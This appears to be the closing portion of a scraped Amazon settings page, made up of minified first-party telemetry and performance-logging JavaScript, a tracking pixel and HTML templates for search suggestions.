(function(m,a){function c(k){function f(b){b&&"string"===typeof b&&(b=(b=b.match(/^(?:https?:)?\/\/(.*?)(\/|$)/i))&&1<b.length?b[1]:null,b&&b&&("number"===typeof e[b]?e[b]++:e[b]=1))}function d(b){var e=10,d=+new Date;b&&b.timeRemaining?e=b.timeRemaining():b={timeRemaining:function(){return Math.max(0,e-(+new Date-d))}};for(var c=a.performance.getEntries(),k=e;g<c.length&&k>n;)c[g].name&&f(c[g].name),g++,k=b.timeRemaining();g>=c.length?h(!0):l()}function h(b){if(!b){b=m.scripts;var c;if(b)for(var d=
0;d<b.length;d++)(c=b[d].getAttribute("src"))&&"undefined"!==c&&f(c)}0<Object.keys(e).length&&(p&&ue_csm.ue&&ue_csm.ue.event&&ue_csm.ue.event({domains:e,pageType:a.ue_pty||null,subPageType:a.ue_spty||null,pageTypeId:a.ue_pti||null},"csm","csm.CrossOriginDomains.2"),a.ue_ext=e)}function l(){!0===k?d():a.requestIdleCallback?a.requestIdleCallback(d):a.requestAnimationFrame?a.requestAnimationFrame(d):a.setTimeout(d,100)}function c(){if(a.performance&&a.performance.getEntries){var b=a.performance.getEntries();
!b||0>=b.length?h(!1):l()}else h(!1)}var e=a.ue_ext||{};a.ue_ext||c();return e}function q(){setTimeout(c,r)}var s=a.ue_dserr||!1,p=!0,n=1,r=2E3,g=0;a.ue_err&&s&&(a.ue_err.errorHandlers||(a.ue_err.errorHandlers=[]),a.ue_err.errorHandlers.push({name:"ext",handler:function(a){if(!a.logLevel||"FATAL"===a.logLevel){var f=c(!0),d=[],h;for(h in f){var f=h,g=f.match(/amazon(\.com?)?\.\w{2,3}$/i);g&&1<g.length||-1!==f.indexOf("amazon-adsystem.com")||-1!==f.indexOf("amazonpay.com")||-1!==f.indexOf("cloudfront-labs.amazonaws.com")||
d.push(h)}a.ext=d}}}));a.ue&&a.ue.isl?c():a.ue&&ue.attach&&ue.attach("load",q)})(document,window);





var ue_wtc_c = 3;
ue_csm.ue.exec(function(b,e){function l(){for(var a=0;a<f.length;a++)a:for(var d=s.replace(A,f[a])+g[f[a]]+t,c=arguments,b=0;b<c.length;b++)try{c[b].send(d);break a}catch(e){}g={};f=[];n=0;k=p}function u(){B?l(q):l(C,q)}function v(a,m,c){r++;if(r>w)d.count&&1==r-w&&(d.count("WeblabTriggerThresholdReached",1),b.ue_int&&console.error("Number of max call reached. Data will no longer be send"));else{var h=c||{};h&&-1<h.constructor.toString().indexOf(D)&&a&&-1<a.constructor.toString().indexOf(x)&&m&&-1<
m.constructor.toString().indexOf(x)?(h=b.ue_id,c&&c.rid&&(h=c.rid),c=h,a=encodeURIComponent(",wl="+a+"/"+m),2E3>a.length+p?(2E3<k+a.length&&u(),void 0===g[c]&&(g[c]="",f.push(c)),g[c]+=a,k+=a.length,n||(n=e.setTimeout(u,E))):b.ue_int&&console.error("Invalid API call. The input provided is over 2000 chars.")):d.count&&(d.count("WeblabTriggerImproperAPICall",1),b.ue_int&&console.error("Invalid API call. The input provided does not match the API protocol i.e ue.trigger(String, String, Object)."))}}function F(){d.trigger&&
d.trigger.isStub&&d.trigger.replay(function(a){v.apply(this,a)})}function y(){z||(f.length&&l(q),z=!0)}var t=":1234",s="//"+b.ue_furl+"/1/remote-weblab-triggers/1/OE/"+b.ue_mid+":"+b.ue_sid+":PLCHLDR_RID$s:wl-client-id%3DCSMTriger",A="PLCHLDR_RID",E=b.wtt||1E4,p=s.length+t.length,w=b.mwtc||2E3,G=1===e.ue_wtc_c,B=3===e.ue_wtc_c,H=e.XMLHttpRequest&&"withCredentials"in new e.XMLHttpRequest,x="String",D="Object",d=b.ue,g={},f=[],k=p,n,z=!1,r=0,C=function(){return{send:function(a){if(H){var b=new e.XMLHttpRequest;
b.open("GET",a,!0);G&&(b.withCredentials=!0);b.send()}else throw"";}}}(),q=function(){return{send:function(a){(new Image).src=a}}}();e.encodeURIComponent&&(d.attach&&(d.attach("beforeunload",y),d.attach("pagehide",y)),F(),d.trigger=v)},"client-wbl-trg")(ue_csm,window);


(function(k,d,h){function f(a,c,b){a&&a.indexOf&&0===a.indexOf("http")&&0!==a.indexOf("https")&&l(s,c,a,b)}function g(a,c,b){a&&a.indexOf&&(location.href.split("#")[0]!=a&&null!==a&&"undefined"!==typeof a||l(t,c,a,b))}function l(a,c,b,e){m[b]||(e=u&&e?n(e):"N/A",d.ueLogError&&d.ueLogError({message:a+c+" : "+b,logLevel:v,stack:"N/A"},{attribution:e}),m[b]=1,p++)}function e(a,c){if(a&&c)for(var b=0;b<a.length;b++)try{c(a[b])}catch(d){}}function q(){return d.performance&&d.performance.getEntriesByType?
d.performance.getEntriesByType("resource"):[]}function n(a){if(a.id)return"//*[@id='"+a.id+"']";var c;c=1;var b;for(b=a.previousSibling;b;b=b.previousSibling)b.nodeName==a.nodeName&&(c+=1);b=a.nodeName;1!=c&&(b+="["+c+"]");a.parentNode&&(b=n(a.parentNode)+"/"+b);return b}function w(){var a=h.images;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"img",a);g(b,"img",a)})}function x(){var a=h.scripts;a&&a.length&&e(a,function(a){var b=a.getAttribute("src");f(b,"script",a);g(b,"script",a)})}
function y(){var a=h.styleSheets;a&&a.length&&e(a,function(a){if(a=a.ownerNode){var b=a.getAttribute("href");f(b,"style",a);g(b,"style",a)}})}function z(){if(A){var a=q();e(a,function(a){f(a.name,a.initiatorType)})}}function B(){e(q(),function(a){g(a.name,a.initiatorType)})}function r(){var a;a=d.location&&d.location.protocol?d.location.protocol:void 0;"https:"==a&&(z(),w(),x(),y(),B(),p<C&&setTimeout(r,D))}var s="[CSM] Insecure content detected ",t="[CSM] Ajax request to same page detected ",v="WARN",
m={},p=0,D=k.ue_nsip||1E3,C=5,A=1==k.ue_urt,u=!0;ue_csm.ue_disableNonSecure||(d.performance&&d.performance.setResourceTimingBufferSize&&d.performance.setResourceTimingBufferSize(300),r())})(ue_csm,window,document);


var ue_aa_a = "C";
if (ue.trigger && (ue_aa_a === "C" || ue_aa_a === "T1")) {
    ue.trigger("UEDATA_AA_SERVERSIDE_ASSIGNMENT_CLIENTSIDE_TRIGGER_190249", ue_aa_a);
}
(function(f,b){function g(){try{b.PerformanceObserver&&"function"===typeof b.PerformanceObserver&&(a=new b.PerformanceObserver(function(b){c(b.getEntries())}),a.observe(d))}catch(h){k()}}function m(){for(var h=d.entryTypes,a=0;a<h.length;a++)c(b.performance.getEntriesByType(h[a]))}function c(a){if(a&&Array.isArray(a)){for(var c=0,e=0;e<a.length;e++){var d=l.indexOf(a[e].name);if(-1!==d){var g=Math.round(b.performance.timing.navigationStart+a[e].startTime);f.uet(n[d],void 0,void 0,g);c++}}l.length===
c&&k()}}function k(){a&&a.disconnect&&"function"===typeof a.disconnect&&a.disconnect()}if("function"===typeof f.uet&&b.performance&&"object"===typeof b.performance&&b.performance.getEntriesByType&&"function"===typeof b.performance.getEntriesByType&&b.performance.timing&&"object"===typeof b.performance.timing&&"number"===typeof b.performance.timing.navigationStart){var d={entryTypes:["paint"]},l=["first-paint","first-contentful-paint"],n=["fp","fcp"],a;try{m(),g()}catch(p){f.ueLogError(p,{logLevel:"ERROR",
attribution:"performanceMetrics"})}}})(ue_csm,window);


if (window.csa) {
    csa("Events")("setEntity", {
        page:{pageType: "CPEFront", subPageType: "settings", pageTypeId: ""}
    });
}
csa.plugin(function(e){var t="PageTiming",n=e("Events",{producerId:"csa"}),o=(e.global.performance||{}).timing,a=["navigationStart","unloadEventStart","unloadEventEnd","redirectStart","redirectEnd","fetchStart","domainLookupStart","domainLookupEnd","connectStart","connectEnd","secureConnectionStart","requestStart","responseStart","responseEnd","domLoading","domInteractive","domContentLoadedEventStart","domContentLoadedEventEnd","domComplete","loadEventStart","loadEventEnd"],r=(o||{}).navigationStart,d={},c=0,i=0,m=e.config[t+".BatchInterval"]||3e3,u=0;function s(){!function(){if(u)return;for(var t=0;t<a.length;t++)o[a[t]]&&(d[a[t]]=o[a[t]]-r);u=1}(),c=1,g()}function g(){0<Object.keys(d).length&&(n("log",{markers:d,schemaId:"csa.PageLatency.2"}),d={}),i=0}o&&(e.once("$unload",s),e.once("$load",s),e.register(t,{mark:function(t,n){d[t]=(void 0===n?e.time():n)-r,c&&!i&&(i=setTimeout(g,m))}}))});csa.plugin(function(i){var s,e="CacheDetection",n="csa-cache",u="onsuccess",d="target",p="result",l="exp",f=i.exec,c=i.config,g=c[e+".RequestID"],v=c[e+".Callback"],h=c[e+".EnableCallback"],I=1,t=i.global,r=t.document||{},a=t.indexedDB,x=t.IDBKeyRange,b=i("Events"),C=i("Events",{producerId:"csa"});if(a&&x)try{var o=a.open(n);o.onupgradeneeded=f(function(e){e[d][p].createObjectStore(n).createIndex(l,l)}),o[u]=f(function(e){var o=e[d][p].transaction(n,"readwrite").objectStore(n);o.get(g)[u]=f(function(e){var n=D("session-id"),c=function(e){var n=D("cdn-rid");if(n)return{r:n,s:"cdn"};if(e)return{r:i.UUID().toUpperCase().replace(/-/g,"").slice(0,20),s:"device"}}(e[d][p])||{},t=c.r,r=c.s,a=!!t;!function(e){var n=Date.now(),c=x.upperBound(n);e.index(l).openCursor(c)[u]=f(function(e){var n=e[d][p];n&&(n.delete(),n.continue())}),e.put({exp:n+60*I*60*1e3},g)}(o),function(e,n,c){b("setEntity",{page:{requestId:e||g,cacheRequestId:n?g:s,pageSource:n?"cache":"origin"},session:{id:c}}),n&&C("log",{schemaId:"csa.CacheImpression.1"},{ent:"all"})}(t,a,n),a&&h&&v&&v(t,n,r)})})}catch(e){}function D(e){try{var n=r.cookie.match(RegExp("(^| )"+e+"=([^;]+)"));return n&&n[2].trim()}catch(e){}}});
if (window.ue && window.ue.uels) {
    ue.uels("https://c.amazon-adsystem.com/bao-csm/forensics/a9-tq-forensics.min.js");
}









}
/* ◬ */
</script>

</div>

<noscript>
    <img height="1" width="1" style='display:none;visibility:hidden;' src='//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:144-6121204-6279753:YF5GA687BG8W5SSXJPYR$uedata=s:%2Fgp%2Fuedata%3Fnoscript%26id%3DYF5GA687BG8W5SSXJPYR:0' alt=""/>
</noscript>
</div>
<!--       _
       .__(.)< (MEOW)
        \___)   
 ~~~~~~~~~~~~~~~~~~-->
<!-- sp:eh:iYSfuYnPr6zV34B0fZaFc47Fs1s2UfL3PcTZzZuiBsZY5n30WopJXWYEq3pw4T/9ZqNbPDFkmDSHqCawCzWMw2Y+6bFAjhNCDKSUEiZjYMXwCdDS6zIPIfKKpKc= -->
<div id="a-popover-root" style="z-index:-1;position:absolute;"></div>




















<script type="text/html" id="s-suggestion"><div id="<#= suggestionId #>"class="s-suggestion"data-alias="<#= alias #>"data-keyword="<#= keyword #>"data-store="<#= store #>"data-isSc="<#= isSpellCorrected #>"data-isFb="<#= isFallback #>"data-type="<#= type #>"data-nid="<#= browseNodeId #>"data-reftag="<#= refTag #>"data-crid="<#= completionResponseId #>"><# if (!skipDisplay) { for (var i = 0; i < highlightFragments.length; i++) {if (!highlightFragments[i].isHit) { #><span class="s-heavy"><# } #><#= highlightFragments[i].text #><# if (!highlightFragments[i].isHit) { #></span><# } #><# } #><# } #><# if (typeof storeHtml === "string") { #> <#= storeHtml #><# } #></div></script><script type="text/html" id="suggestions-template"><div id="suggestions-template"><# if (typeof suggestionTitle !== "undefined") { #><div id="suggestion-title"><#= suggestionTitle #></div><# } #><# if (typeof biaTitle !== "undefined") { #><a href="<#= biaWidgetUrl #>" style="text-decoration: none !important;"><p class="s-bia-suggestion"><strong><#= biaTitle #></strong></p></a><# } #><div id="suggestions" dir="auto"><# if (typeof suggestions !== "undefined") {for(var i=0; i < suggestions.length; i++) {var displayString = suggestions[i].display; #><#= displayString #><# }} #></div></div></script><script type="text/html" id="promoted-suggestion"><div class="s-suggestion s-suggestion-link-template"><a href="<#= widgetItems[0].metadata.link_url #>"><#for (var i = 0; i < highlightFragments.length; i++) {if (highlightFragments[i].isHighlight) { #><span class="s-heavy"><# } #><#= highlightFragments[i].text #><# if (highlightFragments[i].isHighlight) { #></span><# } #><# } #></a></div></script><script type="text/html" id="s-recentSearch"><div id="<#= suggestionId #>" class="s-suggestion s-recentSearch s-recentSearchDistinct" data-alias="<#= alias #>" data-keyword="<#= keyword #>" data-store="<#= store #>" data-isSc="false" data-isFb="false" data-type="<#= type #>"><span class="s-heavy"><#= bprefix #></span><#= prefix #><span class="s-heavy"><#= suffix #></span><# if (typeof storeHtml === "string") { #> <#= storeHtml #><# } #><span id="delete-<#= suggestionId #>" class="s-suggestion-deleteDistinct"><i id="delete-icon-<#= suggestionId #>" class="a-icon a-icon-remove"></i></span> </div></script><script type="text/html" id="s-separator"><div id="s-separator"><div class="s-separator"></div></div></script><script type="text/html" id="s-option"><option value="<#= value #>"><#= store #></option></script><script type="text/html" id="s-minimal"><div class="s-suggestion s-custom" data-url="<#= url #>"><#= bprefix #><span class="s-heavy"><#= prefix #></span><#= suffix #></div></script><script type="text/html" id="s-storeText"><span class="<#= cssClasses #>"><#= store #></span></script><script type="text/html" id="s-nextSearch"><div id="<#= suggestionId #>" <# if (nextSearchTemplateType === "T2") { #>class="s-suggestion s-nextSearch s-nextSearch-block s-nextSearch-cell" <# } else { #>class="s-suggestion s-nextSearch" <# } #>data-alias="<#= alias #>" data-keyword="<#= keywords #>" data-isSc="false" data-isFb="false" data-type="<#= type #>"><#= keywords #></div></script><script type="text/html" id="s-qu-suggestion"><div id="<#= suggestionId #>"class="s-suggestion s-qu-suggestion"data-keyword="<#= keyword #>"data-store="<#= store #>"data-isSc="<#= isSpellCorrected #>"data-type="<#= type #>"data-qu-type="<#= qu.type #>"data-qu-value="<#= qu.value #>"data-crid="<#= completionResponseId #>"><span class="s-qu-display-string"><#= qu.displayString  #></span></div></script><script type="text/html" id="asin"><div class="s-asin-suggestion s-suggestion"><a class="s-asin-sug-link" href="<#= widgetItems[0].metadata.link_url #>"><div class="s-asin-sug-left"><div class="s-asin-image-container" style="opacity: 1;"><img class="s-asin-image" src="<#= widgetItems[0].metadata.image_url #>"></div></div><div class="s-asin-sug-right"><div class="s-size-mini s-sug-pp-caption"><#= widgetItems[0].metadata.asin_header #></div><div class="s-asin-title"><#= widgetItems[0].metadata.asin_title #></div></div></a></div></script><script type="text/html" id="keywords-link"><div class="s-suggestion s-suggestion-link-template"><a href="<#= widgetItems[0].metadata.link_url #>"><#for (var i = 0; i < highlightFragments.length; i++) {if (highlightFragments[i].isHighlight) { #><span class="s-heavy"><# } #><#= highlightFragments[i].text #><# if (highlightFragments[i].isHighlight) { #></span><# } #><# } #></a></div></script><script type="text/html" id="keywords-badge-link"><div class="s-suggestion s-suggestion-link-template"><a href="<#= widgetItems[0].metadata.link_url #>"><#for (var i = 0; i < highlightFragments.length; i++) {if (highlightFragments[i].isHighlight) { #><span class="s-heavy"><# } #><#= highlightFragments[i].text #><# if (highlightFragments[i].isHighlight) { #></span><# } #><# } #><# if (widgetItems[0].metadata.badge_type === "PRIME") { #><i class="a-icon a-icon-prime a-icon-medium" role="img" aria-label="Amazon Prime"></i><# } #></a></div></script><script type="text/html" id="pre-search-suggestion"><div id="pre-search-suggestion"><div class="s-suggestion pss-dropdown-title"><#=metadata[language]#></div><# for(var i=0; i < widgetItems.length; i++) {var keywords = widgetItems[i].metadata.keywords; #><div class="s-suggestion s-heavy" data-alias="<#= alias #>" data-keyword="<#= keywords #>" data-type="a9" data-crid="<#= completionResponseId #>" data-reftag="<#= refTag #>"><#= keywords #></div><#} #></div></script><script type="text/html" id="discover-top-grey"><div id="s-suggestion discover-suggestion"><div class="discover-sug-container-top"><# for(var i=0; i < widgetItems.length; i++) {var metadata = widgetItems[i].metadata; #><div class="discover-sug-column"><div class="discover-sug-card"><a class="discover-sug-link" href="<#= metadata.link_url #>"><div class="discover-sug-image-container"><img class="discover-sug-image" src="<#= metadata.image_url #>"><div class="discover-sug-image-background discover-sug-image-grey-shield"></div></div><div class="discover-sug-text"><#= metadata.text #></div></a></div></div><#} #></div><hr class="discover-hr"></div></script><script type="text/html" id="discover-bot-grey"><div id="s-suggestion discover-suggestion"><hr class="discover-hr"><div class="discover-sug-container-bot"><# for(var i=0; i < widgetItems.length; i++) {var metadata = widgetItems[i].metadata; #><div class="discover-sug-column"><div class="discover-sug-card"><a class="discover-sug-link" href="<#= metadata.link_url #>"><div class="discover-sug-image-container"><img class="discover-sug-image" src="<#= metadata.image_url #>"><div class="discover-sug-image-background discover-sug-image-grey-shield"></div></div><div class="discover-sug-text"><#= metadata.text #></div></a></div></div><#} #></div></div></script><script type="text/html" id="discover-top-clear"><div id="s-suggestion discover-suggestion"><div class="discover-sug-container-top"><# for(var i=0; i < widgetItems.length; i++) {var metadata = widgetItems[i].metadata; #><div class="discover-sug-column"><div class="discover-sug-card"><a class="discover-sug-link" href="<#= metadata.link_url #>"><div class="discover-sug-image-container"><img class="discover-sug-image" src="<#= metadata.image_url #>"><div class="discover-sug-image-background"></div></div><div class="discover-sug-text"><#= metadata.text #></div></a></div></div><#} #></div><hr class="discover-hr"></div></script><script type="text/html" id="discover-bot-clear"><div id="s-suggestion discover-suggestion"><hr class="discover-hr"><div class="discover-sug-container-bot"><# for(var i=0; i < widgetItems.length; i++) {var metadata = widgetItems[i].metadata; #><div class="discover-sug-column"><div class="discover-sug-card"><a class="discover-sug-link" href="<#= metadata.link_url #>"><div class="discover-sug-image-container"><img class="discover-sug-image" src="<#= metadata.image_url #>"><div class="discover-sug-image-background"></div></div><div class="discover-sug-text"><#= metadata.text #></div></a></div></div><#} #></div></div></script></body></html>